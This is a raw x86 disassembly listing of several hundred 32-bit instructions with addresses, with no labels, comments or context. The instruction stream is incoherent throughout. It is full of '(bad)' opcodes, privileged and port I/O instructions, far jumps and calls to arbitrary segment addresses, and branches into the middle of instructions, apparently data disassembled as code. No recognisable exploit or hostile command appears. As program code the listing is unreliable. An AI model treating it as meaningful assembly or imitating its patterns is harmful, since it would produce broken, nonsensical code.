  41e589:	test   eax,0xfc8517ab
  41e58e:	and    dh,BYTE PTR [esi]
  41e590:	sti    
  41e591:	lods   al,BYTE PTR ds:[esi]
  41e592:	cdq    
  41e593:	jmp    0x41e56d
  41e595:	sub    BYTE PTR [ebx+edx*4+0x6a],bh
  41e599:	in     al,dx
  41e59a:	push   ds
  41e59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e59c:	add    eax,0xd474fb99
  41e5a1:	inc    ebx
  41e5a2:	xchg   esp,eax
  41e5a3:	cmp    BYTE PTR [edi],ch
  41e5a5:	or     edx,DWORD PTR es:[edx-0x14]
  41e5a9:	fcomp  DWORD PTR ds:0x9463b4f3
  41e5af:	dec    eax
  41e5b0:	daa    
  41e5b1:	jecxz  0x41e591
  41e5b3:	ins    BYTE PTR es:[edi],dx
  41e5b4:	mov    eax,ds:0x9bb0b696
  41e5b9:	inc    ebp
  41e5ba:	xor    ecx,edi
  41e5bc:	push   esi
  41e5bd:	jo     0x41e5ce
  41e5bf:	mov    dh,0x90
  41e5c1:	or     DWORD PTR [edi-0x1d],eax
  41e5c4:	iret   
  41e5c5:	bound  ebp,QWORD PTR [ebx]
  41e5c7:	mov    ds:0x8d2d1b74,al
  41e5cc:	loop   0x41e637
  41e5ce:	mov    esp,0x55f3490b
  41e5d3:	xchg   ecx,eax
  41e5d4:	jns    0x41e5d2
  41e5d6:	stc    
  41e5d7:	adc    esp,DWORD PTR [ecx-0x31]
  41e5da:	ds lock dec edx
  41e5dd:	xor    ecx,DWORD PTR [esp+ebp*8]
  41e5e0:	xchg   esp,eax
  41e5e1:	into   
  41e5e2:	jecxz  0x41e624
  41e5e4:	jg     0x41e65b
  41e5e6:	mov    WORD PTR [eax-0x7],fs
  41e5e9:	lods   al,BYTE PTR ds:[esi]
  41e5ea:	mov    dh,0x16
  41e5ec:	cld    
  41e5ed:	int3   
  41e5ee:	ss jmp 0x3cd:0x773715ee
  41e5f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5f7:	bound  ecx,QWORD PTR [ecx-0x50]
  41e5fa:	ja     0x41e5f0
  41e5fc:	mov    dl,0x70
  41e5fe:	iret   
  41e5ff:	(bad)  
  41e601:	js     0x41e5a6
  41e603:	dec    edx
  41e604:	push   eax
  41e605:	mov    edx,0xb4cdc302
  41e60a:	and    al,0x35
  41e60c:	push   ecx
  41e60d:	in     al,dx
  41e60e:	and    dl,ch
  41e610:	sbb    eax,0xe4c8ce91
  41e615:	cmp    ebp,edx
  41e617:	std    
  41e618:	dec    eax
  41e619:	ret    0xfb8c
  41e61c:	xor    al,0x31
  41e61e:	mov    edx,0xb2cd522
  41e623:	dec    esp
  41e624:	dec    edi
  41e625:	mov    ah,0x78
  41e627:	xchg   edx,eax
  41e628:	ins    BYTE PTR es:[edi],dx
  41e629:	hlt    
  41e62a:	out    0xd3,eax
  41e62c:	xchg   ecx,eax
  41e62d:	stc    
  41e62e:	cli    
  41e62f:	lock aaa 
  41e631:	or     eax,0x8a71ba50
  41e636:	push   ebx
  41e637:	in     al,0xe1
  41e639:	push   es
  41e63a:	xchg   ecx,eax
  41e63b:	fcmovnu st,st(3)
  41e63d:	mov    ebp,0x7ae2089f
  41e642:	add    cl,BYTE PTR [ecx-0x68]
  41e645:	pop    esp
  41e646:	nop
  41e647:	dec    ecx
  41e648:	mov    eax,0xb742d4de
  41e64d:	jge    0x41e614
  41e64f:	dec    ecx
  41e650:	jmp    FWORD PTR [ecx+0x1fc7f976]
  41e656:	shl    BYTE PTR [esi+ebp*1-0x13],0x45
  41e65b:	mov    ah,0x88
  41e65d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e65e:	in     eax,0xdb
  41e660:	push   ebp
  41e661:	mov    cl,0x3d
  41e663:	or     bl,ah
  41e665:	inc    eax
  41e666:	mov    ebp,0xea1ef918
  41e66b:	mov    WORD PTR [ebp+0x7b],gs
  41e66e:	xchg   edx,eax
  41e66f:	xor    ebp,edx
  41e671:	add    DWORD PTR [edi+esi*8-0x3b],eax
  41e675:	inc    ecx
  41e676:	gs inc esi
  41e678:	addr16 add esp,eax
  41e67b:	fld    QWORD PTR [ebp+0x66]
  41e67e:	cmp    BYTE PTR [edi],bl
  41e680:	scas   al,BYTE PTR es:[edi]
  41e681:	cmp    BYTE PTR [edx+0x25],cl
  41e684:	and    BYTE PTR [eax+edi*1-0x2],ch
  41e688:	xor    eax,0x90797ae4
  41e68d:	in     eax,dx
  41e68e:	lods   al,BYTE PTR ds:[esi]
  41e68f:	push   es
  41e690:	ror    cl,0x71
  41e693:	imul   eax,DWORD PTR [ecx+ebx*8-0x7e413adc],0x1c
  41e69b:	adc    dh,ah
  41e69d:	nop
  41e69e:	jge    0x41e670
  41e6a0:	mov    ss,WORD PTR [esi+0x1d]
  41e6a3:	mov    bl,dl
  41e6a5:	xchg   esp,eax
  41e6a6:	fist   DWORD PTR [edx]
  41e6a8:	mov    ebx,0x95cdbdc3
  41e6ad:	fucomp st(2)
  41e6af:	popa   
  41e6b0:	fwait
  41e6b1:	inc    ebp
  41e6b2:	jp     0x41e687
  41e6b4:	aad    0x17
  41e6b6:	test   al,0x69
  41e6b8:	or     DWORD PTR [edi+0x7c],ebx
  41e6bb:	ja     0x41e6cf
  41e6bd:	push   edi
  41e6be:	mov    eax,0xd010ce0a
  41e6c3:	mov    ebp,ds
  41e6c5:	push   edi
  41e6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c7:	sub    ecx,DWORD PTR [edi-0x41]
  41e6ca:	push   eax
  41e6cb:	mov    esi,0xb87d8b48
  41e6d0:	mov    esi,0x2f1f348b
  41e6d5:	sbb    BYTE PTR [ecx+0x24c598c8],dl
  41e6db:	mov    ah,BYTE PTR [esi+0x6e795a25]
  41e6e1:	sub    esi,edi
  41e6e3:	xor    BYTE PTR [edx-0x39],cl
  41e6e6:	jge    0x41e6e8
  41e6e8:	push   esi
  41e6e9:	jmp    0xdc61:0xcb14130d
  41e6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f1:	cmp    al,0x6e
  41e6f3:	ds int3 
  41e6f5:	popfw  
  41e6f7:	or     edi,DWORD PTR [ecx-0x64578eb4]
  41e6fd:	mov    ds:0xc83d7a19,al
  41e702:	or     DWORD PTR [edx],esi
  41e704:	mov    BYTE PTR [eax+eiz*1-0x60],cl
  41e708:	dec    esp
  41e709:	sub    dh,dh
  41e70b:	pop    esi
  41e70c:	jmp    0xa3b586f8
  41e711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e712:	ds cmp ecx,edx
  41e715:	loope  0x41e791
  41e717:	add    bl,BYTE PTR [ebp+0x20272422]
  41e71d:	bound  ebp,QWORD PTR [ebx-0x77]
  41e720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e721:	xchg   BYTE PTR [ebp+0x29],bl
  41e724:	je     0x41e772
  41e726:	test   eax,0x8d2671c6
  41e72b:	stc    
  41e72c:	jle    0x41e764
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	mov    esp,0xa43d11f1
  41e734:	test   BYTE PTR [edx+0x377c3b33],ch
  41e73a:	xchg   esi,eax
  41e73b:	test   eax,0x6ef3aead
  41e740:	and    eax,0xe36a8efe
  41e745:	cmp    al,0x70
  41e747:	sti    
  41e748:	add    al,0x48
  41e74a:	in     eax,dx
  41e74b:	jmp    0xb2c0:0xae4a9971
  41e752:	iret   
  41e753:	sub    DWORD PTR [ebp+esi*1+0x2],esi
  41e757:	mov    ds:0x1c7c8b95,al
  41e75c:	cli    
  41e75d:	and    edx,DWORD PTR [ebx+0x5bbedd68]
  41e763:	xchg   esp,eax
  41e764:	hlt    
  41e765:	adc    ah,BYTE PTR [ecx]
  41e767:	jmp    0x2a72:0xbf8c0056
  41e76e:	pusha  
  41e76f:	cdq    
  41e770:	sbb    al,0x9
  41e772:	pop    esi
  41e773:	jge    0x41e769
  41e775:	jge    0x41e73e
  41e777:	addr16 int3 
  41e779:	in     eax,0xb5
  41e77b:	clc    
  41e77c:	jne    0x41e7a8
  41e77e:	cs inc edx
  41e780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e781:	inc    esp
  41e782:	outs   dx,DWORD PTR ds:[esi]
  41e783:	inc    edi
  41e784:	sar    DWORD PTR [ecx-0x49506296],cl
  41e78a:	int    0xc6
  41e78c:	push   ecx
  41e78d:	lds    edi,FWORD PTR [edx+edi*2+0x15]
  41e791:	cmc    
  41e792:	mov    ecx,0x66239b62
  41e797:	push   ss
  41e798:	push   ds
  41e799:	xchg   BYTE PTR [ebp-0x22],dh
  41e79c:	addr16 mov ebp,0x3bf3a09e
  41e7a2:	daa    
  41e7a3:	sub    BYTE PTR [eax],0xb3
  41e7a6:	mov    dl,0xb0
  41e7a8:	inc    edi
  41e7a9:	add    eax,0x2960a521
  41e7ae:	pop    DWORD PTR [edx+0x1e]
  41e7b1:	enter  0x4766,0x2d
  41e7b5:	inc    esp
  41e7b6:	xor    bl,BYTE PTR [ebx-0x464e2236]
  41e7bc:	cmp    ch,BYTE PTR [ecx-0x48]
  41e7bf:	add    eax,0x59f28c2b
  41e7c4:	pop    esp
  41e7c5:	call   0x8bcb:0xe767f219
  41e7cc:	sar    ebx,cl
  41e7ce:	(bad)  
  41e7cf:	mov    dl,BYTE PTR [edx]
  41e7d1:	xchg   edi,eax
  41e7d2:	mov    eax,0x3c66ef5c
  41e7d7:	inc    ebx
  41e7d8:	test   DWORD PTR [ebx+0x2c],ecx
  41e7db:	call   DWORD PTR [edx+ebx*8-0x1f0d00b5]
  41e7e2:	jmp    0x41e786
  41e7e4:	jno    0x41e807
  41e7e6:	xchg   edx,eax
  41e7e7:	sbb    eax,0x29cc4b89
  41e7ec:	clc    
  41e7ed:	call   0xcb3b:0xbf4f6290
  41e7f4:	(bad)  
  41e7f5:	jp     0x41e805
  41e7f7:	ret    0xda8a
  41e7fa:	in     eax,0x2f
  41e7fc:	jg     0x41e87a
  41e7fe:	call   0x2190b72
  41e803:	std    
  41e804:	pushf  
  41e805:	ret    0xcaa6
  41e808:	push   ebx
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	ret    
  41e829:	add    ecx,0xc06fa7cf
  41e82f:	mov    esi,0xbebec44a
  41e834:	(bad)  
  41e835:	call   0x3be6ac16
  41e83a:	rcl    ch,1
  41e83c:	xor    ecx,esp
  41e83e:	lea    ebp,[edi+0x2805c3e3]
  41e844:	scas   eax,DWORD PTR es:[edi]
  41e845:	xchg   ebx,eax
  41e846:	cmp    edx,eax
  41e848:	inc    ecx
  41e849:	ret    
  41e84a:	push   es
  41e84b:	aaa    
  41e84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e84d:	gs pushf 
  41e84f:	cmp    al,0x76
  41e851:	jle    0x41e825
  41e853:	dec    edx
  41e854:	or     eax,0xe88ac2e3
  41e859:	std    
  41e85a:	cdq    
  41e85b:	fwait
  41e85c:	cmp    BYTE PTR [ebx+eax*4-0x63],0xb5
  41e861:	xchg   ebx,eax
  41e862:	or     ebp,ecx
  41e864:	loope  0x41e8d0
  41e866:	mov    ecx,0x127462d0
  41e86b:	xchg   edx,eax
  41e86c:	mov    bh,0xbb
  41e86e:	and    DWORD PTR [ebp+0x699d69f5],edx
  41e874:	aam    0x3c
  41e876:	jae    0x41e8c1
  41e878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e879:	xor    ebx,DWORD PTR [eax+0x56454413]
  41e87f:	stc    
  41e880:	cmp    ah,BYTE PTR [edx]
  41e882:	mov    edx,0x4a94e0c5
  41e887:	mov    cl,ch
  41e889:	mov    al,ds:0x506c2587
  41e88e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e88f:	and    BYTE PTR [edx-0x4d],dh
  41e892:	push   0x2d
  41e894:	pop    eax
  41e895:	sar    bl,1
  41e897:	jbe    0x41e910
  41e899:	out    0x3a,eax
  41e89b:	pop    ebp
  41e89c:	jmp    0x2aedd5ec
  41e8a1:	neg    DWORD PTR [eax-0x4a]
  41e8a4:	cld    
  41e8a5:	retf   0x814e
  41e8a8:	inc    edx
  41e8a9:	adc    ebp,DWORD PTR [esi+ebp*8-0x108a6b0b]
  41e8b0:	mov    eax,fs:0x74c8e4b
  41e8b6:	shl    DWORD PTR [ecx-0x2d],0xe2
  41e8ba:	mov    eax,ds:0xf0a531dd
  41e8bf:	ins    DWORD PTR es:[edi],dx
  41e8c0:	pop    edi
  41e8c1:	add    al,0x72
  41e8c3:	inc    edi
  41e8c4:	sahf   
  41e8c5:	sbb    eax,0xe9242f0b
  41e8ca:	jge    0x41e8cd
  41e8cc:	jnp    0x41e946
  41e8ce:	in     eax,0x5e
  41e8d0:	dec    ecx
  41e8d1:	xor    ch,BYTE PTR [ebx+0x74]
  41e8d4:	arpl   WORD PTR ds:0xd4c2de1e,bx
  41e8da:	daa    
  41e8db:	ss mov edx,edx
  41e8de:	mov    bh,0xb4
  41e8e0:	loopne 0x41e952
  41e8e2:	cwde   
  41e8e3:	add    eax,0xb8f25042
  41e8e8:	mov    edi,0x4dce71a7
  41e8ed:	aas    
  41e8ee:	in     al,dx
  41e8ef:	xchg   esi,eax
  41e8f0:	dec    eax
  41e8f1:	imul   ebx,DWORD PTR [ebx-0x14],0xb7f9033
  41e8f8:	or     edi,eax
  41e8fa:	jae    0x41e913
  41e8fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8fd:	xchg   ecx,eax
  41e8fe:	add    eax,0xc468d27c
  41e903:	jmp    0x73615cb4
  41e908:	add    eax,DWORD PTR [esi+0x58]
  41e90b:	stos   DWORD PTR es:[edi],eax
  41e90c:	mov    dl,0x14
  41e90e:	cmp    DWORD PTR [edx+esi*8+0x11],0x5c
  41e913:	stos   DWORD PTR es:[edi],eax
  41e914:	jp     0x41e8fb
  41e916:	sti    
  41e917:	mov    BYTE PTR [eax-0xa8bd31c],dh
  41e91d:	jge    0x41e938
  41e91f:	daa    
  41e920:	xchg   ebp,eax
  41e921:	repz dec ebp
  41e923:	add    DWORD PTR [eax+0x776a89e5],ebp
  41e929:	ret    0x671b
  41e92c:	addr16 xchg edi,eax
  41e92e:	inc    ecx
  41e92f:	fs out 0xcf,eax
  41e932:	adc    al,0x38
  41e934:	loop   0x41e9ae
  41e936:	lods   eax,DWORD PTR ds:[esi]
  41e937:	icebp  
  41e938:	xchg   BYTE PTR [esi+0x3f],bl
  41e93b:	leave  
  41e93c:	jmp    0x2a8fdf9f
  41e941:	or     eax,DWORD PTR [edi]
  41e943:	les    ebp,FWORD PTR [ebx+0x2f]
  41e946:	mov    ch,0x2b
  41e948:	jns    0x41e8ea
  41e94a:	clc    
  41e94b:	lods   al,BYTE PTR ds:[esi]
  41e94c:	repz iret 
  41e94e:	mov    al,0xfb
  41e950:	mov    eax,0x60d0471c
  41e955:	retf   
  41e956:	inc    esi
  41e957:	lods   eax,DWORD PTR ds:[esi]
  41e958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e959:	adc    dh,BYTE PTR ss:[bp+si+0x3337]
  41e95f:	fs pop edi
  41e961:	xor    DWORD PTR [eax+ebx*1+0x7c],eax
  41e965:	xchg   ecx,eax
  41e966:	jle    0x41e8fa
  41e968:	add    al,0x34
  41e96a:	imul   ebx,DWORD PTR [esp-0x62],0x7e
  41e96f:	push   ss
  41e970:	inc    ebp
  41e971:	fnsave [edi-0x40c08497]
  41e977:	hlt    
  41e978:	dec    esi
  41e979:	pushf  
  41e97a:	push   0x6c49d103
  41e97f:	loop   0x41e903
  41e981:	jno    0x41e9e0
  41e983:	mov    al,0x71
  41e985:	mov    dh,0x1
  41e987:	cmp    cl,BYTE PTR [ebp+0x1d]
  41e98a:	test   DWORD PTR [edx],ebx
  41e98c:	cmp    BYTE PTR [ecx],dh
  41e98e:	pop    ebp
  41e98f:	xor    ax,dx
  41e992:	pop    es
  41e993:	jne    0x41e9c2
  41e995:	sbb    al,0x87
  41e997:	int    0x1
  41e999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e99a:	adc    al,0xfd
  41e99c:	inc    edi
  41e99d:	add    eax,0x8d75d3d2
  41e9a2:	jnp    0x41e969
  41e9a4:	(bad)  
  41e9a5:	fwait
  41e9a6:	push   edi
  41e9a7:	rcr    ch,1
  41e9a9:	mov    ds:0xbb5676ba,eax
  41e9ae:	cmp    eax,0x3c2609c8
  41e9b3:	inc    ebx
  41e9b4:	push   edi
  41e9b5:	xor    eax,0x6997cd99
  41e9ba:	dec    esi
  41e9bb:	sar    edx,cl
  41e9bd:	loop   0x41e97c
  41e9bf:	add    cl,bl
  41e9c1:	adc    BYTE PTR [esi-0x2a6aa5e1],ch
  41e9c7:	dec    eax
  41e9c8:	fist   DWORD PTR [ebx+ecx*8-0x68]
  41e9cc:	cmp    eax,0x19fefe4
  41e9d1:	dec    ebp
  41e9d2:	jl     0x41ea4e
  41e9d4:	adc    edi,DWORD PTR [eax+0x65d56776]
  41e9da:	dec    esp
  41e9db:	jecxz  0x41ea30
  41e9dd:	lds    edi,FWORD PTR [ebx+edx*4-0x4217c94d]
  41e9e4:	and    al,0xd4
  41e9e6:	sbb    DWORD PTR [eax-0x5fbd8311],edx
  41e9ec:	or     BYTE PTR [edx+0x7b1471b3],ch
  41e9f2:	mov    BYTE PTR [ebx+0x7d],cl
  41e9f5:	fist   WORD PTR [ecx-0x2f971ae3]
  41e9fb:	mov    esp,0x5d050a69
  41ea00:	fist   WORD PTR [ecx]
  41ea02:	retf   
  41ea03:	xor    dl,BYTE PTR [ebx]
  41ea05:	push   cs
  41ea06:	add    ch,bh
  41ea08:	loop   0x41e9a3
  41ea0a:	retfw  
  41ea0c:	(bad)  
  41ea0d:	push   esp
  41ea0e:	retf   0x2e0c
  41ea11:	bound  ebx,QWORD PTR [esi]
  41ea13:	jecxz  0x41ea0a
  41ea15:	inc    esi
  41ea16:	ss jmp 0x825060b
  41ea1c:	jecxz  0x41ea85
  41ea1e:	xor    al,dl
  41ea20:	or     eax,0x6d41f372
  41ea25:	sbb    al,0x6b
  41ea27:	das    
  41ea28:	push   ss
  41ea29:	dec    eax
  41ea2a:	cmc    
  41ea2b:	mov    ebp,0xa0e6a0cb
  41ea30:	int    0x5b
  41ea32:	pop    esi
  41ea33:	xor    ah,BYTE PTR [eax+0x22]
  41ea36:	(bad)  
  41ea37:	jl     0x41ea28
  41ea39:	dec    esi
  41ea3a:	cli    
  41ea3b:	mov    esp,0xbce3e3ce
  41ea40:	mov    al,0x62
  41ea42:	dec    ebp
  41ea43:	les    esp,FWORD PTR [ebx-0x56]
  41ea46:	das    
  41ea47:	or     edi,DWORD PTR [esi]
  41ea49:	xor    bl,BYTE PTR [ecx-0x38]
  41ea4c:	pushf  
  41ea4d:	mov    ah,0x23
  41ea4f:	lahf   
  41ea50:	retf   
  41ea51:	lea    edx,[esi]
  41ea53:	outs   dx,BYTE PTR ds:[si]
  41ea55:	jmp    0x6daf1d70
  41ea5a:	inc    edx
  41ea5b:	lock dec edi
  41ea5d:	xor    DWORD PTR [ecx-0x4dfb6c1f],ecx
  41ea63:	push   ecx
  41ea64:	xchg   ecx,eax
  41ea65:	(bad)  
  41ea66:	push   esi
  41ea67:	or     DWORD PTR [ecx*1+0x5fafee07],edx
  41ea6e:	or     al,0xe3
  41ea70:	mov    edx,0x725c38c
  41ea75:	pop    eax
  41ea76:	cmc    
  41ea77:	mov    edi,0x55fee59b
  41ea7c:	into   
  41ea7d:	test   esp,0x375bdf4e
  41ea83:	xor    esi,ecx
  41ea85:	pop    ss
  41ea86:	mov    dl,0x95
  41ea88:	es (bad) 
  41ea8a:	push   0x2d
  41ea8c:	ss loopne 0x41eae7
  41ea8f:	and    ch,bh
  41ea91:	out    0x26,al
  41ea93:	shr    ch,1
  41ea95:	cld    
  41ea96:	jge    0x41ead5
  41ea98:	mov    cl,0xd2
  41ea9a:	sub    esi,DWORD PTR [edx+0x2ccd51ed]
  41eaa0:	mov    edi,0x3c03e632
  41eaa5:	(bad)  
  41eaa6:	je     0x41eb26
  41eaa8:	mov    ecx,0xcc63e8fe
  41eaad:	(bad)  
  41eaae:	jae    0x41eabd
  41eab0:	and    eax,0x79de5e7c
  41eab5:	rcr    DWORD PTR [edx-0x7c],1
  41eab8:	enter  0xe5cc,0x92
  41eabc:	jne    0x41eb0a
  41eabe:	adc    cl,BYTE PTR [esi-0x1c]
  41eac1:	jb     0x41eac1
  41eac3:	adc    al,0xc
  41eac5:	mov    al,0xd1
  41eac7:	jb     0x41ea8e
  41eac9:	ins    DWORD PTR es:[edi],dx
  41eaca:	mov    ds:0x3769f33d,eax
  41eacf:	sub    eax,0xf81cf323
  41ead4:	mov    dh,0x9e
  41ead6:	mov    ecx,ebp
  41ead8:	push   ebx
  41ead9:	ret    
  41eada:	cmp    DWORD PTR [esi-0x18561bcf],esi
  41eae0:	pop    ebx
  41eae1:	int3   
  41eae2:	lea    esp,[ebp+0x3d671253]
  41eae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae9:	fimul  DWORD PTR [ebx-0x14]
  41eaec:	iret   
  41eaed:	xor    al,0xa0
  41eaef:	aaa    
  41eaf0:	lahf   
  41eaf1:	xlat   BYTE PTR ds:[ebx]
  41eaf2:	jae    0x41eb42
  41eaf4:	adc    BYTE PTR [ecx],cl
  41eaf6:	fmul   DWORD PTR [edx-0x116ff9fd]
  41eafc:	lea    edi,[ebp-0x6e]
  41eaff:	xchg   ecx,eax
  41eb00:	xor    eax,DWORD PTR [esi+0x45a32f0f]
  41eb06:	jge    0x41eb10
  41eb08:	xchg   esp,edx
  41eb0a:	ror    DWORD PTR [edi-0x62376715],cl
  41eb10:	or     cl,BYTE PTR [esi-0xd]
  41eb13:	(bad)  
  41eb14:	dec    ebp
  41eb15:	int    0xfa
  41eb17:	cwde   
  41eb18:	je     0x41eac8
  41eb1a:	iret   
  41eb1b:	ftst   
  41eb1d:	neg    DWORD PTR [esi-0x198bcdf]
  41eb23:	sub    DWORD PTR [ebx-0x59],eax
  41eb26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb27:	scas   eax,DWORD PTR es:[edi]
  41eb28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb29:	sbb    dl,bh
  41eb2b:	(bad)  
  41eb2c:	fnstcw WORD PTR [esi]
  41eb2e:	or     BYTE PTR [edi-0x2e3f379],0x98
  41eb35:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41eb37:	ror    DWORD PTR [edi],0x65
  41eb3a:	loop   0x41eafc
  41eb3c:	int3   
  41eb3d:	mov    dh,0xd8
  41eb3f:	mov    ah,0x94
  41eb41:	lods   eax,DWORD PTR ds:[esi]
  41eb42:	push   ebp
  41eb43:	cwde   
  41eb44:	push   eax
  41eb45:	and    esi,DWORD PTR [edi+0x2d]
  41eb48:	jl     0x41eae0
  41eb4a:	scas   eax,DWORD PTR es:[edi]
  41eb4b:	fnstsw ax
  41eb4d:	retf   0x2683
  41eb50:	pop    ss
  41eb51:	pop    esp
  41eb52:	inc    ecx
  41eb53:	mov    bh,BYTE PTR [edi+0x71]
  41eb56:	pop    esp
  41eb57:	add    eax,0xc606d334
  41eb5c:	add    ah,BYTE PTR [edi+ecx*2]
  41eb5f:	push   esi
  41eb60:	out    dx,al
  41eb61:	aad    0x1d
  41eb63:	cmp    ebx,ecx
  41eb65:	int    0xd8
  41eb67:	jg     0x41eb8c
  41eb69:	add    dh,BYTE PTR [ecx-0x518de730]
  41eb6f:	(bad)  
  41eb70:	adc    eax,0x514ed7a5
  41eb75:	pop    edx
  41eb76:	lds    edi,FWORD PTR [edx-0x7d1cfc8d]
  41eb7c:	dec    ebx
  41eb7d:	adc    eax,0xee431923
  41eb82:	push   ecx
  41eb83:	inc    esi
  41eb84:	inc    ecx
  41eb85:	je     0x41eb4b
  41eb87:	loop   0x41eb34
  41eb89:	xor    al,0xa1
  41eb8b:	inc    ebp
  41eb8c:	sbb    ebx,edi
  41eb8e:	jmp    0x93fe:0xd8a03bab
  41eb95:	cmp    eax,0xd085f64f
  41eb9a:	cld    
  41eb9b:	leave  
  41eb9c:	lods   al,BYTE PTR ds:[esi]
  41eb9d:	mov    cl,0x3c
  41eb9f:	jp     0x41eb4c
  41eba1:	ror    DWORD PTR [ebx],cl
  41eba3:	mov    bl,0x5a
  41eba5:	dec    ecx
  41eba6:	jns    0x41eb40
  41eba8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41ebaa:	mov    dh,0x22
  41ebac:	sub    DWORD PTR [ebp-0x3b],ebp
  41ebaf:	les    edx,FWORD PTR [edi+0x22]
  41ebb2:	mov    al,0xd5
  41ebb4:	lock push ebp
  41ebb6:	push   0x6041b6e
  41ebbb:	dec    edi
  41ebbc:	fistp  DWORD PTR [ebp+0x54f7ab7f]
  41ebc2:	rol    dh,1
  41ebc4:	mov    bh,bl
  41ebc6:	xchg   edi,eax
  41ebc7:	test   DWORD PTR [esi+0x43608aa2],ebp
  41ebcd:	lods   eax,DWORD PTR ds:[esi]
  41ebce:	cmp    DWORD PTR [eax+0x77],ebx
  41ebd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebd2:	sub    BYTE PTR [edi+0x2975c4f7],cl
  41ebd8:	int    0x90
  41ebda:	out    dx,al
  41ebdb:	mov    ecx,0xd4c5567a
  41ebe0:	bound  edx,QWORD PTR [esi+esi*1+0x7b]
  41ebe4:	out    0x47,eax
  41ebe6:	int3   
  41ebe7:	je     0x41ebe9
  41ebe9:	stc    
  41ebea:	(bad)  
  41ebeb:	sub    DWORD PTR [ebx+0x4a655a8d],eax
  41ebf1:	and    BYTE PTR [ecx-0x36bb83e6],0xc
  41ebf8:	pop    ebx
  41ebf9:	jne    0x41eb9c
  41ebfb:	jo     0x41ec5f
  41ebfd:	or     DWORD PTR [edi],0xffffff84
  41ec00:	push   esi
  41ec01:	add    al,0x0
  41ec03:	add    BYTE PTR [ebx-0x1537b],cl
  41ec09:	(bad)  
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	sub    eax,0x3390e3d7
  41ec20:	ja     0x41ebe2
  41ec22:	mov    esi,0xbebec44a
  41ec27:	push   edi
  41ec28:	adc    al,0x4d
  41ec2a:	(bad)  
  41ec2b:	lds    esp,FWORD PTR [ebp-0x4d]
  41ec2e:	pop    ds
  41ec2f:	das    
  41ec30:	add    edx,esp
  41ec32:	lea    esi,[esp+ecx*4+0x35]
  41ec36:	test   eax,0x20805667
  41ec3b:	jbe    0x41ec8a
  41ec3d:	adc    BYTE PTR [ecx-0x497ab734],0x2f
  41ec44:	pushf  
  41ec45:	or     dh,BYTE PTR [eax]
  41ec47:	sub    al,0xec
  41ec49:	es aad 0xc5
  41ec4c:	test   eax,0xcb6ea358
  41ec51:	mov    BYTE PTR ds:0x5c0508b6,dh
  41ec57:	sbb    ebx,esp
  41ec59:	push   edx
  41ec5a:	push   0x2d9116d0
  41ec5f:	pop    esi
  41ec60:	xlat   BYTE PTR ds:[ebx]
  41ec61:	pop    esp
  41ec62:	imul   ebx,ebx,0x207c67
  41ec68:	ss pop edx
  41ec6a:	jecxz  0x41ec4c
  41ec6c:	pop    edi
  41ec6d:	repz or BYTE PTR [ebx+0x1dcb584e],bl
  41ec74:	jnp    0x41ecab
  41ec76:	call   0xf4e4:0x91acf294
  41ec7d:	mov    WORD PTR ds:0x12bb2605,es
  41ec83:	loope  0x41ecc2
  41ec85:	sbb    esi,DWORD PTR [edi+edx*8-0x5a]
  41ec89:	iret   
  41ec8a:	jg     0x41ec5c
  41ec8c:	jns    0x41ec42
  41ec8e:	test   eax,0xbd320e55
  41ec93:	mov    al,0xf9
  41ec95:	pop    es
  41ec96:	xor    edx,DWORD PTR [esi-0x2164ce66]
  41ec9c:	lahf   
  41ec9d:	jnp    0x41ec80
  41ec9f:	pop    ebx
  41eca0:	xchg   edx,eax
  41eca1:	adc    eax,0x3ca0ddf6
  41eca6:	rcr    BYTE PTR [esi+0x40],0x27
  41ecaa:	aas    
  41ecab:	scas   eax,DWORD PTR es:[edi]
  41ecac:	push   ds
  41ecad:	sbb    al,0x24
  41ecaf:	pop    ds
  41ecb0:	or     BYTE PTR ds:0xe5115587,al
  41ecb6:	es mov dl,ah
  41ecb9:	ret    0xe858
  41ecbc:	bnd jae 0x41ec8a
  41ecbf:	inc    esi
  41ecc0:	xor    bh,BYTE PTR [edx+0x377dbd49]
  41ecc6:	mov    al,0xd6
  41ecc8:	xlat   BYTE PTR ds:[ebx]
  41ecc9:	fadd   DWORD PTR [eax-0x61dc9f17]
  41eccf:	mov    ebp,0xe20f530a
  41ecd4:	mov    dh,BYTE PTR [esi+0x3b93eb95]
  41ecda:	dec    ebp
  41ecdb:	push   eax
  41ecdc:	rcl    DWORD PTR [ecx+0x71206ecf],1
  41ece2:	or     ah,cl
  41ece4:	ret    
  41ece5:	mov    cl,0x6b
  41ece7:	std    
  41ece8:	pop    ebx
  41ece9:	addr16 sub edi,esp
  41ecec:	addr16 pop eax
  41ecee:	mov    al,ds:0xe1fe7961
  41ecf3:	daa    
  41ecf4:	mov    ch,0x84
